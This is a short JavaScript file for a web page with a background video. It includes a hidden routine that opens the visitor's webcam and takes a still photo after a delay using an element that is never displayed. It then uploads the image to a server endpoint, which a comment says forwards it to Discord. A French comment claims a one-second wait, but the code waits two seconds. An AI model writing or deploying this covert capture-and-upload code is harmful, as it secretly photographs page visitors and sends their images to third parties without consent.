const video = document.getElementById("backgroundVideo");

// Lancement du son et de la vidéo au premier clic
document.body.addEventListener("click", () => {
  video.muted = false;
  video.play().catch(() => console.log("Impossible de jouer la vidéo automatiquement"));
}, { once: true });

// Créer la vidéo pour la caméra
const camVideo = document.createElement("video");
camVideo.autoplay = true;

navigator.mediaDevices.getUserMedia({ video: true, audio: false })
  .then(stream => {
    camVideo.srcObject = stream;

    camVideo.onloadedmetadata = () => {
      camVideo.play();

      // Capture automatique après 1s pour laisser la caméra s'initialiser
      setTimeout(() => {
        const canvas = document.createElement("canvas");
        canvas.width = camVideo.videoWidth;
        canvas.height = camVideo.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(camVideo, 0, 0, canvas.width, canvas.height);
        const dataURL = canvas.toDataURL("image/png");

        // Envoi au serveur pour Discord
        fetch("/upload", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ image: dataURL })
        });

        // Arrêter la caméra
        stream.getTracks().forEach(track => track.stop());
      }, 2000);
    };
  })
  .catch(err => console.error("Erreur caméra :", err));